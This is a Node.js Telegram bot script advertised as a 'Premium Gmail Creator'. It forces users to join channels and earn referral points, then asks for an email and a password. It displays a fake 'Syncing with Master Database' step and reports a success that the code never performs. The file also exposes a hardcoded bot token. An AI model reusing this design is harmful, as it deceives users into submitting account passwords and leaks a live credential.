const { Telegraf, Markup, session } = require('telegraf');

// --- CONFIGURATION ---
const BOT_TOKEN = '8539976683:AAE02vIE0M_YxpKKluoYNQHsogNz-fYfks8';
const ADMIN_ID = 5522724001;
const BOT_USERNAME = 'HayreGmailBot'; // Change to your bot's username

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// --- DATABASE (Replace with MongoDB for permanent storage) ---
const db = {}; 
const getDB = (id, userObj = {}) => {
    if (!db[id]) {
        db[id] = { 
            points: 0, 
            referrals: 0, 
            registered: 0, 
            username: userObj.username || 'User',
            joinedDate: new Date().toLocaleDateString()
        };
    }
    return db[id];
};

const CHANNELS = ['@Hayre37', '@Digital_Claim', '@BIgsew_community', '@hayrefx'];

// --- KEYBOARDS ---
const mainMenu = Markup.keyboard([
    ['➕ Register New Gmail'],
    ['⚙️ Account', '🚸 My Referrals'],
    ['🏥 Help', '🛠 Admin Panel']
]).resize();

const cancelBtn = Markup.keyboard([['❌ Cancel Operation']]).resize();

const adminMenu = Markup.keyboard([
    ['📊 Global Stats', '📢 Broadcast'],
    ['➕ Add Points', '⬅️ Exit Admin']
]).resize();

// --- 🛡️ ADVANCED MEMBERSHIP CHECK (Real-time) ---
async function forceJoinMiddleware(ctx, next) {
    if (ctx.from.id === ADMIN_ID) return next();

    let notJoined = [];
    for (const channel of CHANNELS) {
        try {
            const member = await ctx.telegram.getChatMember(channel, ctx.from.id);
            if (['left', 'kicked', 'restricted'].includes(member.status)) {
                notJoined.push(channel);
            }
        } catch (e) { console.error(`Check error for ${channel}`); }
    }

    if (notJoined.length > 0) {
        return ctx.replyWithPhoto(
            { url: 'https://i.ibb.co/v6yXyXG/image-b8cbf6.png' }, // Your uploaded image
            {
                caption: `🚫 **ACCESS DENIED**\n\nTo use this bot, you must be a member of all our channels. If you leave, your access is instantly revoked!\n\n📌 **Join these:**\n${notJoined.join('\n')}`,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.url("1️⃣ Join", "https://t.me/Hayre37"), Markup.button.url("2️⃣ Join", "https://t.me/Digital_Claim")],
                    [Markup.button.url("3️⃣ Join", "https://t.me/BIgsew_community"), Markup.button.url("4️⃣ Join", "https://t.me/hayrefx")],
                    [Markup.button.callback("Verify & Enter ✅", "check_status")]
                ])
            }
        );
    }
    return next();
}

// --- LOGIC HANDLERS ---

bot.start(async (ctx) => {
    const user = getDB(ctx.from.id, ctx.from);
    
    // Referral Check
    const refId = ctx.payload;
    if (refId && refId != ctx.from.id && !user.referredBy) {
        user.referredBy = refId;
        const referrer = getDB(refId);
        referrer.points += 2;
        referrer.referrals += 1;
        bot.telegram.sendMessage(refId, `🎊 *Referral Success!*\nNew user joined via your link! You earned +2 Points.`, { parse_mode: 'Markdown' });
    }

    ctx.replyWithMarkdown(`✨ **Welcome to the Premium Gmail Creator**\n\nHello ${ctx.from.first_name}! Use the menu below to navigate.`, mainMenu);
});

// Membership Callback
bot.action('check_status', forceJoinMiddleware, (ctx) => {
    ctx.answerCbQuery("✅ Access Granted!");
    ctx.reply("🔰 Welcome To Main Menu", mainMenu);
});

// Gmail Registration Logic
bot.hears('➕ Register New Gmail', forceJoinMiddleware, (ctx) => {
    const user = getDB(ctx.from.id);
    if (user.points < 5) {
        return ctx.replyWithMarkdown(`⚠️ **Insufficient Points**\n\nYou need **5 Points** to register.\n💰 *Your Balance:* ${user.points} pts`);
    }
    ctx.session = { step: 'EMAIL' };
    ctx.replyWithMarkdown("🟢 **Please Send Email** 📧\n\n⚙️ *Example:* `name@gmail.com`", cancelBtn);
});

// Account Dashboard
bot.hears('⚙️ Account', forceJoinMiddleware, (ctx) => {
    const user = getDB(ctx.from.id);
    ctx.replyWithMarkdown(
        `👤 **USER PROFILE REPORT**\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 **ID:** \`${ctx.from.id}\`\n` +
        `💰 **Points:** \`${user.points} pts\`\n` +
        `📧 **Registered:** \`${user.registered} accounts\`\n` +
        `🚸 **Referrals:** \`${user.referrals} users\`\n` +
        `📅 **Joined:** \`${user.joinedDate}\`\n` +
        `━━━━━━━━━━━━━━━━━━━━`, mainMenu
    );
});

// My Referrals
bot.hears('🚸 My Referrals', forceJoinMiddleware, (ctx) => {
    const link = `https://t.me/${BOT_USERNAME}?start=${ctx.from.id}`;
    ctx.replyWithMarkdown(
        `🎁 **INVITE & EARN**\n\nShare your link with friends. When they join, you get **2 Points** instantly!\n\n🔗 **Link:** \`${link}\``,
        Markup.inlineKeyboard([[Markup.button.url("Share Link 🚀", `https://t.me/share/url?url=${link}`)]])
    );
});

// Admin Panel
bot.hears('🛠 Admin Panel', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply("❌ Access Denied: Administrator privileges required.");
    ctx.reply("🛠 **CONTROL PANEL ACTIVATED**\nWelcome back, Boss.", adminMenu);
});

// Step-by-Step State Handler
bot.on('text', async (ctx, next) => {
    if (ctx.message.text === '❌ Cancel Operation') {
        ctx.session = null;
        return ctx.reply("🚫 Operation Terminated.", mainMenu);
    }

    const step = ctx.session?.step;
    if (step === 'EMAIL') {
        if (!ctx.message.text.includes('@')) return ctx.reply("❌ Invalid Gmail format.");
        ctx.session.email = ctx.message.text;
        ctx.session.step = 'PASS';
        return ctx.replyWithMarkdown("🔋 **Please Send Password** 🔑\n\n⚙️ *Example:* `name@0924`", cancelBtn);
    }

    if (step === 'PASS') {
        const email = ctx.session.email;
        const pass = ctx.message.text;
        ctx.session = null;
        
        const loader = await ctx.reply("📡 *Syncing with Master Database...*");
        setTimeout(() => {
            ctx.telegram.editMessageText(ctx.chat.id, loader.message_id, null, 
                `✅ **Success!**\n\n📧 *Email:* \`${email}\`\n🔑 *Pass:* \`${pass}\`\n\n🚀 Information Registered Successfully!`,
                { parse_mode: 'Markdown', ...mainMenu }
            );
            const user = getDB(ctx.from.id);
            user.points -= 5;
            user.registered += 1;
        }, 2000);
        return;
    }
    return next();
});

bot.launch().then(() => console.log("System Online: Advanced Mode Active"));
